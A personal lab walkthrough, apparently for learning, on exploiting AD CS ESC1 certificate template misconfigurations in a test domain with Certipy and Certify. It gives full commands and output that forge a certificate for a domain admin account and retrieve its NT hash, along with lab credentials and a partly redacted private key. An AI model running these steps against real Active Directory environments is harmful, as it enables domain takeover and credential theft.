**Some notes on Active Directory Certificate Services (ADCS) Exploitation**

This is a good video https://youtu.be/wozcGjAsfZ0?si=1LJ4wjcHEblrV_4P which explains AD CS ESC1 Privilege Escalation exploitation, but also shows how to configure the vulnerable certificate and how to remediate them.

**Using Certipy which is arguably the easier method.**

**Install certipy in Ubuntu**

Create a Python virtualenv which is an isolated Python environment, allowing you to install any tool and update it without the risk of impacting other python tools.

```
mkdir Tools
sudo apt install python3.10-venv

ubuntu@ubuntu-virtual-machine:~/Documents/Tools$ python3 -m venv .
ubuntu@ubuntu-virtual-machine:~/Documents/Tools$ source bin/activate
```

To return to the normal environment, type deactivate

```
(Tools) ubuntu@ubuntu-virtual-machine:~/Documents/Tools$ deactivate
ubuntu@ubuntu-virtual-machine:~/Documents/Tools$ 
```

To return back to the virtual environment

```
ubuntu@ubuntu-virtual-machine:~/Documents/Tools$ sudo python3 -m venv .
ubuntu@ubuntu-virtual-machine:~/Documents/Tools$ source bin/activate
(Tools) ubuntu@ubuntu-virtual-machine:~/Documents/Tools$ 
```

Then install certipy-ad into your new isolated Python environment

```
(Tools) ubuntu@ubuntu-virtual-machine:~/Documents/Tools$ pip3 install certipy-ad
```
And install ldap3

```
(Tools) ubuntu@ubuntu-virtual-machine:~/Documents/Tools$ pip3 install git+https://github.com/ly4k/ldap3
```

**Locate AD CS ESC1 vulnerable certificates and exploit them**

1. Find the certs

```
certipy find -u g.white -p "Passw0rd!" -dc-ip 192.168.68.230 -scheme ldaps -ldap-channel-binding
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 35 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 13 enabled certificate templates
[*] Trying to get CA configuration for 'hacklab-WIN-8HPLF8PSHC1-CA' via CSRA
[!] Got error while trying to get CA configuration for 'hacklab-WIN-8HPLF8PSHC1-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
[*] Trying to get CA configuration for 'hacklab-WIN-8HPLF8PSHC1-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Got CA configuration for 'hacklab-WIN-8HPLF8PSHC1-CA'
[*] Saved BloodHound data to '20240701104154_Certipy.zip'. Drag and drop the file into the BloodHound GUI from @ly4k
[*] Saved text output to '20240701104154_Certipy.txt'
[*] Saved JSON output to '20240701104154_Certipy.json'
```

2. Review the the cert output.

```
(Tools) ubuntu@ubuntu-virtual-machine:~/Documents/Tools$ gedit 20240701104154_Certipy.txt

Certificate Authorities
  0
    CA Name                             : hacklab-WIN-8HPLF8PSHC1-CA
    DNS Name                            : WIN-8HPLF8PSHC1.hacklab.local
    Certificate Subject                 : CN=hacklab-WIN-8HPLF8PSHC1-CA, DC=hacklab, DC=local
    Certificate Serial Number           : 354DB064F33080BD4EB9FEAABE87DCF1
    Certificate Validity Start          : 2024-04-23 13:56:37+00:00
    Certificate Validity End            : 2029-04-23 14:06:33+00:00
    Web Enrollment                      : Disabled
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Permissions
      Owner                             : HACKLAB.LOCAL\Administrators
      Access Rights
        ManageCertificates              : HACKLAB.LOCAL\Administrators
                                          HACKLAB.LOCAL\Domain Admins
                                          HACKLAB.LOCAL\Enterprise Admins
        ManageCa                        : HACKLAB.LOCAL\Administrators
                                          HACKLAB.LOCAL\Domain Admins
                                          HACKLAB.LOCAL\Enterprise Admins
        Enroll                          : HACKLAB.LOCAL\Authenticated Users
Certificate Templates
  0
    Template Name                       : ESC3-Vuln2
    Display Name                        : ESC3-Vuln2
    Enabled                             : False
    Client Authentication               : True
    Enrollment Agent                    : True
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectRequireDirectoryPath
                                          SubjectRequireEmail
                                          SubjectAltRequireEmail
                                          SubjectAltRequireUpn
    Enrollment Flag                     : AutoEnrollment
                                          PublishToDs
                                          IncludeSymmetricAlgorithms
    Private Key Flag                    : 16777216
                                          65536
                                          ExportableKey
    Extended Key Usage                  : Smart Card Logon
                                          Server Authentication
                                          KDC Authentication
                                          Secure Email
                                          Microsoft Trust List Signing
                                          Encrypting File System
                                          Client Authentication
                                          Certificate Request Agent
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Permissions
      Enrollment Permissions
        Enrollment Rights               : HACKLAB.LOCAL\Domain Admins
                                          HACKLAB.LOCAL\Enterprise Admins
      Object Control Permissions
        Owner                           : HACKLAB.LOCAL\Administrator
        Full Control Principals         : HACKLAB.LOCAL\Domain Users
        Write Owner Principals          : HACKLAB.LOCAL\Domain Admins
                                          HACKLAB.LOCAL\Enterprise Admins
                                          HACKLAB.LOCAL\Administrator
                                          HACKLAB.LOCAL\Domain Users
        Write Dacl Principals           : HACKLAB.LOCAL\Domain Admins
                                          HACKLAB.LOCAL\Enterprise Admins
                                          HACKLAB.LOCAL\Administrator
                                          HACKLAB.LOCAL\Domain Users
        Write Property Principals       : HACKLAB.LOCAL\Domain Admins
                                          HACKLAB.LOCAL\Enterprise Admins
                                          HACKLAB.LOCAL\Administrator
                                          HACKLAB.LOCAL\Domain Users
    [!] Vulnerabilities
      ESC3                              : 'HACKLAB.LOCAL\\Domain Users' can enroll and template has Certificate Request Agent EKU set
      ESC4                              : 'HACKLAB.LOCAL\\Domain Users' has dangerous permissions
  1
    Template Name                       : ESC1-Vun1
    Display Name                        : ESC1-Vun1
    Certificate Authorities             : hacklab-WIN-8HPLF8PSHC1-CA - **Note you need this info**.
    Enabled                             : True - ** Note to exploit this needs to be enabled **.
    Client Authentication               : True - ** Note to exploit this needs to be enabled **.
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True - ** Note to exploit this needs to be enabled **.
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Enrollment Flag                     : PublishToDs
    Private Key Flag                    : 16777216
                                          65536
    Extended Key Usage                  : Server Authentication
                                          Client Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Permissions
      Enrollment Permissions
        Enrollment Rights               : HACKLAB.LOCAL\Domain Users - ** Note to exploit this Domain Users needs to be enabled or Domain Computers **. 
                                          HACKLAB.LOCAL\Domain Admins
                                          HACKLAB.LOCAL\Domain Computers
                                          HACKLAB.LOCAL\Enterprise Admins
                                          HACKLAB.LOCAL\Authenticated Users
      Object Control Permissions
        Owner                           : HACKLAB.LOCAL\Administrator
        Write Owner Principals          : HACKLAB.LOCAL\Domain Admins
                                          HACKLAB.LOCAL\Enterprise Admins
                                          HACKLAB.LOCAL\Administrator
        Write Dacl Principals           : HACKLAB.LOCAL\Domain Admins
                                          HACKLAB.LOCAL\Enterprise Admins
                                          HACKLAB.LOCAL\Administrator
        Write Property Principals       : HACKLAB.LOCAL\Domain Admins
                                          HACKLAB.LOCAL\Enterprise Admins
                                          HACKLAB.LOCAL\Administrator
    [!] Vulnerabilities
      ESC1                              : 'HACKLAB.LOCAL\\Domain Users', 'HACKLAB.LOCAL\\Domain Computers' and 'HACKLAB.LOCAL\\Authenticated Users' can enroll, enrollee supplies subject and template allows client authentication
```

The certipy tool will highlight certs that are vulnerable by appending [!] Vulnerabilities ESC1 at the end of the certificate. The following sections are required to exploit a cert.

From the Certificate Authorities section, you need the CA Name and the DNS Name which in this example is the domain controllers host name.

```
  0
    CA Name                             : hacklab-WIN-8HPLF8PSHC1-CA
    DNS Name                            : WIN-8HPLF8PSHC1.hacklab.local
```

**Following this for a certificate to be vulnerable it requires the configuration to be set as defined below.**

```
Template Name                       : Add_Vulnerable_ Certs_Name
Enabled                             : True
Client Authentication               : True
Enrollee Supplies Subject           : True

Enrollment Rights               : HACKLAB.LOCAL\Domain Users
```



3. Create a TGT

```
(Tools) ubuntu@ubuntu-virtual-machine:~/Documents/Tools$ getTGT.py hacklab.local/g.white:'Passw0rd!' -dc-ip 192.168.68.230
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Saving ticket in g.white.ccache
```

4. Export the TGT

```
(Tools) ubuntu@ubuntu-virtual-machine:~/Documents/Tools$ export KRB5CCNAME=g.white.ccache
(Tools) ubuntu@ubuntu-virtual-machine:~/Documents/Tools$ 
```

5. Verify you can ping the targets host name which in this circumstance was WIN-8HPLF8PSHC1.hacklab.local, if you can't ping it, add the host name to your Ubuntu /etc/hosts file.

```
sudo nano /etc/hosts

127.0.0.1       localhost
127.0.1.1       ubuntu-virtual-machine

192.168.68.230  WIN-8HPLF8PSHC1.hacklab.local


ping WIN-8HPLF8PSHC1.hacklab.local
PING WIN-8HPLF8PSHC1.hacklab.local (192.168.68.230) 56(84) bytes of data.
64 bytes from WIN-8HPLF8PSHC1.hacklab.local (192.168.68.230): icmp_seq=1 ttl=128 time=12.8 ms
64 bytes from WIN-8HPLF8PSHC1.hacklab.local (192.168.68.230): icmp_seq=2 ttl=128 time=1.15 ms
```


6. Exploit the vuln certificate

```
(Tools) ubuntu@ubuntu-virtual-machine:~/Documents/Tools$ certipy req -u g.white -k -no-pass -ca 'hacklab-WIN-8HPLF8PSHC1-CA' -target 'WIN-8HPLF8PSHC1.hacklab.local' -template ESC1-Vun1 -dc-ip 192.168.68.230 -ptt -upn 'da1@hacklab.local' -debug
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[+] Domain retrieved from CCache: HACKLAB.LOCAL
[+] Username retrieved from CCache: g.white
[+] Trying to resolve 'WIN-8HPLF8PSHC1.hacklab.local' at '192.168.68.230'
[+] Generating RSA key
[*] Requesting certificate via RPC
[+] Using Kerberos Cache: g.white.ccache
[+] Using TGT from cache
[+] Username retrieved from CCache: g.white
[+] Getting TGS for 'host/WIN-8HPLF8PSHC1.hacklab.local'
[+] Got TGS for 'host/WIN-8HPLF8PSHC1.hacklab.local'
[+] Trying to connect to endpoint: ncacn_np:192.168.68.230[\pipe\cert]
[+] Connected to endpoint: ncacn_np:192.168.68.230[\pipe\cert]
[*] Successfully requested certificate
[*] Request ID is 7
[*] Got certificate with UPN 'da1@hacklab.local'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'da1.pfx'
```

5. Extract a copy of the NTLM Hash

```
(Tools) ubuntu@ubuntu-virtual-machine:~/Documents/Tools$ certipy auth -pfx da1.pfx -dc-ip 192.168.68.230
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: da1@hacklab.local
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'da1.ccache'
[*] Trying to retrieve NT hash for 'da1'
[*] Got hash for 'da1@hacklab.local': aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889
```





**Common errors and how to fix them**

1. CRYPT_E_REVOCATION_OFFLINE - The revocation function was unable to check revocation because the revocation server was offline.

Two fixes for this error, the first approach is to reboot the DC, the second approach is listed below.

```
(Tools) ubuntu@ubuntu-virtual-machine:~/Documents/Tools$ certipy req -u g.white -k -no-pass -ca 'hacklab-WIN-8HPLF8PSHC1-CA' -target 'WIN-8HPLF8PSHC1.hacklab.local' -template ESC1-Vun1 -dc-ip 192.168.68.230 -ptt -upn 'da1@hacklab.local' -debug
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[+] Domain retrieved from CCache: HACKLAB.LOCAL
[+] Username retrieved from CCache: g.white
[+] Trying to resolve 'WIN-8HPLF8PSHC1.hacklab.local' at '192.168.68.230'
[+] Generating RSA key
[*] Requesting certificate via RPC
[+] Using Kerberos Cache: g.white.ccache
[+] Using TGT from cache
[+] Username retrieved from CCache: g.white
[+] Getting TGS for 'host/WIN-8HPLF8PSHC1.hacklab.local'
[+] Got TGS for 'host/WIN-8HPLF8PSHC1.hacklab.local'
[+] Trying to connect to endpoint: ncacn_np:192.168.68.230[\pipe\cert]
[+] Connected to endpoint: ncacn_np:192.168.68.230[\pipe\cert]
[-] Got error while trying to request certificate: code: 0x80092013 - CRYPT_E_REVOCATION_OFFLINE - The revocation function was unable to check revocation because the revocation server was offline.
[*] Request ID is 6
Would you like to save the private key? (y/N) 
[-] Failed to request certificate
```

Fix - https://stealthpuppy.com/resolving-issues-starting-ca-offline-crl/

Open admin CMD on your DC and execute

```
certutil –setreg ca\CRLFlags +CRLF_REVCHECK_IGNORE_OFFLINE
```


```
C:\Users\Administrator>certutil -setreg ca\CRLFlags +CRLF_REVCHECK_IGNORE_OFFLINE
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\hacklab-WIN-8HPLF8PSHC1-CA\CRLFlags:

Old Value:
  CRLFlags REG_DWORD = 2
    CRLF_DELETE_EXPIRED_CRLS -- 2

New Value:
  CRLFlags REG_DWORD = a (10)
    CRLF_DELETE_EXPIRED_CRLS -- 2
    CRLF_REVCHECK_IGNORE_OFFLINE -- 8
CertUtil: -setreg command completed successfully.
The CertSvc service may need to be restarted for changes to take effect.
```


2. TGT: Kerberos SessionError: KDC_ERR_KEY_EXPIRED(Password has expired; change password to reset)

Meaning - The DA accounts password has not been configured to never expire, it has expired requiring it to be changed before an NTLM hash can be harvested.

```
(Tools) ubuntu@ubuntu-virtual-machine:~/Documents/Tools$ certipy req -u g.white -k -no-pass -ca 'hacklab-WIN-8HPLF8PSHC1-CA' -target 'WIN-8HPLF8PSHC1.hacklab.local' -template ESC1-Vun1 -dc-ip 192.168.68.230 -ptt -upn 'svc_admin@hacklab.local' -debug
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[+] Domain retrieved from CCache: HACKLAB.LOCAL
[+] Username retrieved from CCache: g.white
[+] Trying to resolve 'WIN-8HPLF8PSHC1.hacklab.local' at '192.168.68.230'
[+] Generating RSA key
[*] Requesting certificate via RPC
[+] Using Kerberos Cache: g.white.ccache
[+] Using TGT from cache
[+] Username retrieved from CCache: g.white
[+] Getting TGS for 'host/WIN-8HPLF8PSHC1.hacklab.local'
[+] Got TGS for 'host/WIN-8HPLF8PSHC1.hacklab.local'
[+] Trying to connect to endpoint: ncacn_np:192.168.68.230[\pipe\cert]
[+] Connected to endpoint: ncacn_np:192.168.68.230[\pipe\cert]
[*] Successfully requested certificate
[*] Request ID is 8
[*] Got certificate with UPN 'svc_admin@hacklab.local'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'svc_admin.pfx'
(Tools) ubuntu@ubuntu-virtual-machine:~/Documents/Tools$ certipy auth -pfx svc_admin.pfx -dc-ip 192.168.68.230
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: svc_admin@hacklab.local
[*] Trying to get TGT...
[-] Got error while trying to request TGT: Kerberos SessionError: KDC_ERR_KEY_EXPIRED(Password has expired; change password to reset)
```

Reset the password on the DC for that account and it will then work.

```
(Tools) ubuntu@ubuntu-virtual-machine:~/Documents/Tools$ certipy req -u g.white -k -no-pass -ca 'hacklab-WIN-8HPLF8PSHC1-CA' -target 'WIN-8HPLF8PSHC1.hacklab.local' -template ESC1-Vun1 -dc-ip 192.168.68.230 -ptt -upn 'svc_admin@hacklab.local' -debug
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[+] Domain retrieved from CCache: HACKLAB.LOCAL
[+] Username retrieved from CCache: g.white
[+] Trying to resolve 'WIN-8HPLF8PSHC1.hacklab.local' at '192.168.68.230'
[+] Generating RSA key
[*] Requesting certificate via RPC
[+] Using Kerberos Cache: g.white.ccache
[+] Using TGT from cache
[+] Username retrieved from CCache: g.white
[+] Getting TGS for 'host/WIN-8HPLF8PSHC1.hacklab.local'
[+] Got TGS for 'host/WIN-8HPLF8PSHC1.hacklab.local'
[+] Trying to connect to endpoint: ncacn_np:192.168.68.230[\pipe\cert]
[+] Connected to endpoint: ncacn_np:192.168.68.230[\pipe\cert]
[*] Successfully requested certificate
[*] Request ID is 9
[*] Got certificate with UPN 'svc_admin@hacklab.local'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'svc_admin.pfx'
(Tools) ubuntu@ubuntu-virtual-machine:~/Documents/Tools$ certipy auth -pfx svc_admin.pfx -dc-ip 192.168.68.230
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: svc_admin@hacklab.local
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'svc_admin.ccache'
[*] Trying to retrieve NT hash for 'svc_admin'
[*] Got hash for 'svc_admin@hacklab.local': aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889
```

**Using Certify**

Finding Vulnerable certs

```
C:\Users\g.white\Desktop\Tools>Certify.exe find /vulnerable

   _____          _   _  __
  / ____|        | | (_)/ _|
 | |     ___ _ __| |_ _| |_ _   _
 | |    / _ \ '__| __| |  _| | | |
 | |___|  __/ |  | |_| | | | |_| |
  \_____\___|_|   \__|_|_|  \__, |
                             __/ |
                            |___./
  v1.1.0

[*] Action: Find certificate templates
[*] Using the search base 'CN=Configuration,DC=hacklab,DC=local'

[*] Listing info about the Enterprise CA 'hacklab-WIN-8HPLF8PSHC1-CA'

    Enterprise CA Name            : hacklab-WIN-8HPLF8PSHC1-CA
    DNS Hostname                  : WIN-8HPLF8PSHC1.hacklab.local
    FullName                      : WIN-8HPLF8PSHC1.hacklab.local\hacklab-WIN-8HPLF8PSHC1-CA
    Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED
    Cert SubjectName              : CN=hacklab-WIN-8HPLF8PSHC1-CA, DC=hacklab, DC=local
    Cert Thumbprint               : 51A0D5E415EF8F50F5B4CA8CEC632B3D5A85F9E7
    Cert Serial                   : 354DB064F33080BD4EB9FEAABE87DCF1
    Cert Start Date               : 23/04/2024 14:56:37
    Cert End Date                 : 23/04/2029 15:06:33
    Cert Chain                    : CN=hacklab-WIN-8HPLF8PSHC1-CA,DC=hacklab,DC=local
    UserSpecifiedSAN              : Disabled
    CA Permissions                :
      Owner: BUILTIN\Administrators        S-1-5-32-544

      Access Rights                                     Principal

      Allow  Enroll                                     NT AUTHORITY\Authenticated UsersS-1-5-11
      Allow  ManageCA, ManageCertificates               BUILTIN\Administrators        S-1-5-32-544
      Allow  ManageCA, ManageCertificates               HACKLAB\Domain Admins         S-1-5-21-2199964591-1196550447-1073987862-512
      Allow  ManageCA, ManageCertificates               HACKLAB\Enterprise Admins     S-1-5-21-2199964591-1196550447-1073987862-519
    Enrollment Agent Restrictions : None

[!] Vulnerable certificate templates that exist but an Enterprise CA does not publish:

    ESC3-Vuln2


[!] Vulnerable Certificates Templates :

    CA Name                               : WIN-8HPLF8PSHC1.hacklab.local\hacklab-WIN-8HPLF8PSHC1-CA
    Template Name                         : ESC1-Vun1
    Schema Version                        : 2
    Validity Period                       : 1 year
    Renewal Period                        : 6 weeks
    msPKI-Certificate-Name-Flag          : ENROLLEE_SUPPLIES_SUBJECT
    mspki-enrollment-flag                 : PUBLISH_TO_DS
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Client Authentication, Server Authentication
    mspki-certificate-application-policy  : Client Authentication, Server Authentication
    Permissions
      Enrollment Permissions
        Enrollment Rights           : HACKLAB\Domain Admins         S-1-5-21-2199964591-1196550447-1073987862-512
                                      HACKLAB\Domain Computers      S-1-5-21-2199964591-1196550447-1073987862-515
                                      HACKLAB\Domain Users          S-1-5-21-2199964591-1196550447-1073987862-513
                                      HACKLAB\Enterprise Admins     S-1-5-21-2199964591-1196550447-1073987862-519
                                      NT AUTHORITY\Authenticated UsersS-1-5-11
      Object Control Permissions
        Owner                       : HACKLAB\Administrator         S-1-5-21-2199964591-1196550447-1073987862-500
        WriteOwner Principals       : HACKLAB\Administrator         S-1-5-21-2199964591-1196550447-1073987862-500
                                      HACKLAB\Domain Admins         S-1-5-21-2199964591-1196550447-1073987862-512
                                      HACKLAB\Enterprise Admins     S-1-5-21-2199964591-1196550447-1073987862-519
        WriteDacl Principals        : HACKLAB\Administrator         S-1-5-21-2199964591-1196550447-1073987862-500
                                      HACKLAB\Domain Admins         S-1-5-21-2199964591-1196550447-1073987862-512
                                      HACKLAB\Enterprise Admins     S-1-5-21-2199964591-1196550447-1073987862-519
        WriteProperty Principals    : HACKLAB\Administrator         S-1-5-21-2199964591-1196550447-1073987862-500
                                      HACKLAB\Domain Admins         S-1-5-21-2199964591-1196550447-1073987862-512
                                      HACKLAB\Enterprise Admins     S-1-5-21-2199964591-1196550447-1073987862-519

    CA Name                               : WIN-8HPLF8PSHC1.hacklab.local\hacklab-WIN-8HPLF8PSHC1-CA
    Template Name                         : Vuln_Cert
    Schema Version                        : 2
    Validity Period                       : 1 year
    Renewal Period                        : 6 weeks
    msPKI-Certificate-Name-Flag          : ENROLLEE_SUPPLIES_SUBJECT
    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Client Authentication, Encrypting File System, Secure Email
    mspki-certificate-application-policy  : Client Authentication, Encrypting File System, Secure Email
    Permissions
      Enrollment Permissions
        Enrollment Rights           : HACKLAB\Domain Admins         S-1-5-21-2199964591-1196550447-1073987862-512
                                      HACKLAB\Domain Users          S-1-5-21-2199964591-1196550447-1073987862-513
                                      HACKLAB\Enterprise Admins     S-1-5-21-2199964591-1196550447-1073987862-519
                                      NT AUTHORITY\Authenticated UsersS-1-5-11
      Object Control Permissions
        Owner                       : HACKLAB\Administrator         S-1-5-21-2199964591-1196550447-1073987862-500
        WriteOwner Principals       : HACKLAB\Administrator         S-1-5-21-2199964591-1196550447-1073987862-500
                                      HACKLAB\Domain Admins         S-1-5-21-2199964591-1196550447-1073987862-512
                                      HACKLAB\Enterprise Admins     S-1-5-21-2199964591-1196550447-1073987862-519
        WriteDacl Principals        : HACKLAB\Administrator         S-1-5-21-2199964591-1196550447-1073987862-500
                                      HACKLAB\Domain Admins         S-1-5-21-2199964591-1196550447-1073987862-512
                                      HACKLAB\Enterprise Admins     S-1-5-21-2199964591-1196550447-1073987862-519
        WriteProperty Principals    : HACKLAB\Administrator         S-1-5-21-2199964591-1196550447-1073987862-500
                                      HACKLAB\Domain Admins         S-1-5-21-2199964591-1196550447-1073987862-512
                                      HACKLAB\Enterprise Admins     S-1-5-21-2199964591-1196550447-1073987862-519



Certify completed in 00:00:01.2930508
```

**The following details the sections that make a certificate vulnerable to ESC1, please seek the sections with the ** for more info.**

```
CA Name                               : WIN-8HPLF8PSHC1.hacklab.local\hacklab-WIN-8HPLF8PSHC1-CA
    Template Name                         : ESC1-Vun1 - **You need this** 
    Schema Version                        : 2
    Validity Period                       : 1 year
    Renewal Period                        : 6 weeks
    msPKI-Certificate-Name-Flag          : ENROLLEE_SUPPLIES_SUBJECT - **To be vuln it has to say ENROLLEE_SUPPLIES_SUBJECT**
    mspki-enrollment-flag                 : PUBLISH_TO_DS
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Client Authentication, Server Authentication  - **To be vuln it has to include Client Authentication**
    mspki-certificate-application-policy  : Client Authentication, Server Authentication
    Permissions
      Enrollment Permissions
        Enrollment Rights           : HACKLAB\Domain Admins         S-1-5-21-2199964591-1196550447-1073987862-512
                                      HACKLAB\Domain Computers      S-1-5-21-2199964591-1196550447-1073987862-515
                                      HACKLAB\Domain Users          S-1-5-21-2199964591-1196550447-1073987862-513
                                      HACKLAB\Enterprise Admins     S-1-5-21-2199964591-1196550447-1073987862-519
                                      NT AUTHORITY\Authenticated UsersS-1-5-11 - **To be vuln it has to include Authenticated UsersS-1-5-11**
      Object Control Permissions
        Owner                       : HACKLAB\Administrator         S-1-5-21-2199964591-1196550447-1073987862-500
        WriteOwner Principals       : HACKLAB\Administrator         S-1-5-21-2199964591-1196550447-1073987862-500
                                      HACKLAB\Domain Admins         S-1-5-21-2199964591-1196550447-1073987862-512
                                      HACKLAB\Enterprise Admins     S-1-5-21-2199964591-1196550447-1073987862-519
        WriteDacl Principals        : HACKLAB\Administrator         S-1-5-21-2199964591-1196550447-1073987862-500
                                      HACKLAB\Domain Admins         S-1-5-21-2199964591-1196550447-1073987862-512
                                      HACKLAB\Enterprise Admins     S-1-5-21-2199964591-1196550447-1073987862-519
        WriteProperty Principals    : HACKLAB\Administrator         S-1-5-21-2199964591-1196550447-1073987862-500
                                      HACKLAB\Domain Admins         S-1-5-21-2199964591-1196550447-1073987862-512
                                      HACKLAB\Enterprise Admins     S-1-5-21-2199964591-1196550447-1073987862-519
```

Exploiting the certificate and requesting a certificate associated with the account that belongs to the domain admins group.

```
C:\Users\g.white\Desktop\Tools>certify.exe request /ca:WIN-8HPLF8PSHC1.hacklab.local\hacklab-WIN-8HPLF8PSHC1-CA /template:ESC1-Vun1 /altname:da1

   _____          _   _  __
  / ____|        | | (_)/ _|
 | |     ___ _ __| |_ _| |_ _   _
 | |    / _ \ '__| __| |  _| | | |
 | |___|  __/ |  | |_| | | | |_| |
  \_____\___|_|   \__|_|_|  \__, |
                             __/ |
                            |___./
  v1.1.0

[*] Action: Request a Certificates

[*] Current user context    : HACKLAB\g.white
[*] No subject name specified, using current context as subject.

[*] Template                : ESC1-Vun1
[*] Subject                 : CN=g.white, OU=Administration, OU=Head_Office, OU=Departments, DC=hacklab, DC=local
[*] AltName                 : da1

[*] Certificate Authority   : WIN-8HPLF8PSHC1.hacklab.local\hacklab-WIN-8HPLF8PSHC1-CA

[*] CA Response             : The certificate had been issued.
[*] Request ID              : 15

[*] cert.pem         :

-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAsNLW/YHm5zlhkQe0oGGEvHge3RYqtmChX7R6OpWWQc8fevLs
Q18laqoZferjm5GPwADobns8Ll1zcE01fy+ifLVR3LGJV67usQcdRVMZmNcgxs9n
YtWL11EzPMF1I9tGx0kbIPfw1Y+EmMTeb7Jr7PfcLtzm0o29FriLtKrqkTaQB4+R
Ab2wS1mIQJ34H+zRGALkw1zHi1SXjgxQV/XQraudgIOEtOhL83TMGVpmLSyPWN3Q
97ptHY41hg8SuakASciZmImvqLd5jieafgPYLfmWF+WYuq5PPyGRg0XqVQ9MXG6a
zatLC4grP-Redacted-Ia0aSwBxGM975oj/WOXO8I5N64o+yH6
8MeRU6RdNQdbJ79n0v75aqSV/oHeneEBN5t3/A+kntiXEi05LqWrXE7QyPkLZfvB
CHMYqK2D1R+lcFu8FPzkTXPxfgqTJUJqSJ3+zBDw7nH4RlilMEaWY10GxyoLj8O2
xOu6GF+RAoGBAN61sAk26pjaSr80EIm8Vf1RMWGFu7/uIWHZ9x4de2xEfjMSid72
oaJFp7e7p9XdAcFFseF2Myt2WK5hB0xv6QcCHIYVX0ODRELe3RHm/TZOLVeqxZO0
nGIoZw93QvGNM/Ku1R+J7sxQSwucy853Btz++fIrDmgUfyzgEmxLX2vTAoGBAMtB
QK2qYbjIW5pMtQLTxQ3fTuPzcTViYHScbE0FfWCxzyiZK12uRH7A97nHhdtyw+s4
ous4z012U3aVv4-Redacted-pDlRjOJiNVdcAVdDFq58r
ShxKaEzeUxK4nHhDoqdXLtcAxHEi8ZasjLgAv5/DkpGxmwSxoMPGZJKj4UoKZZGt
NiEugT4VjFQn+/qITM2NC+CLAoGAaCwQbzG1FhSyRjnsR/+rrjl2YIRj0F2UXA/T
vgIDSWy4ZPFj9Yacmm5iSPhG1btTSJplfbNHJEdx7YRAe1ISEMmmrTDsMCqkMRNX
5oUlL+lNcF7Goj4qS6sA0WU1KxblpGu4zggpeLTvQ9yVXv4M8oWOBKFIPmKv9qm6
ZO2IOy8CgYAeF18wJSkfYmqk4hYhopzWQP5v0gOvENAe1v8hsT8LtYMPUCRGpcoC
mKHvi46BRdYBpOI6uh30xuvbahy19v6O+8R966X7piFnFpzUQi0GHUe9OBCQZiWo
D5ktQd28gl0x6AnnPt9p1ZXSEbMI8afxcQHZn7kdfxWOnC/1OTiN6A==
-----END RSA PRIVATE KEY-----
-----BEGIN CERTIFICATE-----
MIIGHjCCBQagAwIBAgITHAAAAA/TpYI1etGPcAAAAAAADzANBgkqhkiG9w0BAQsF
ADBVMRUwEwYKCZImiZPyLGQBGRYFbG9jYWwxFzAVBgoJkiaJk/IsZAEZFgdoYWNr
bGFiMSMwIQYDVQQDExpoYWNrbGFiLVdJTi04SFBMRjhQU0hDMS1DQTAeFw0yNDA3
MTUxMTI1MTZaFw0yNTA3MTUxMTI1MTZaMIGHMRUwEwYKCZImiZPyLGQBGRYFbG9j
YWwxFzAVBgoJkiaJk/IsZAEZFgdoYWNrbGFiMRQwEgYDVQQLEwtEZXBhcnRtZW50
czEUMBIGA1UECwwLSGVhZF9PZmZpY2UxFzAVBgNVBAsTDkFkbWluaXN0cmF0aW9u
MRAwDgYDVQQDEwdnLndoaXRlMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKC
AQEAsNLW/YHm5zlhkQe0oGGEvHge3RYqtmChX7R6OpWWQc8fevLsQ18laqoZferj
m5GPwADobns8Ll1zcE01fy+ifLVR3LGJV67usQcdRVMZmNcgxs9nYtWL11EzPMF1
I9tGx0kbIPfw1Y-Redacted-PEdIevkzuBaITl5VaD9cE4AgFkAgEI
MB0GA1UdJQQWMBQGCCsGAQUFBwMBBggrBgEFBQcDAjAOBgNVHQ8BAf8EBAMCBaAw
JwYJKwYBBAGCNxUKBBowGDAKBggrBgEFBQcDATAKBggrBgEFBQcDAjAdBgNVHQ4E
FgQUeMBVjiux6/Z28M2g+1iGdQstLOEwHgYDVR0RBBcwFaATBgorBgEEAYI3FAID
oAUMA2RhMTAfBgNVHSMEGDAWgBSAEotT6qXYz/osdwaI1ufK7UYqHDCB4gYDVR0f
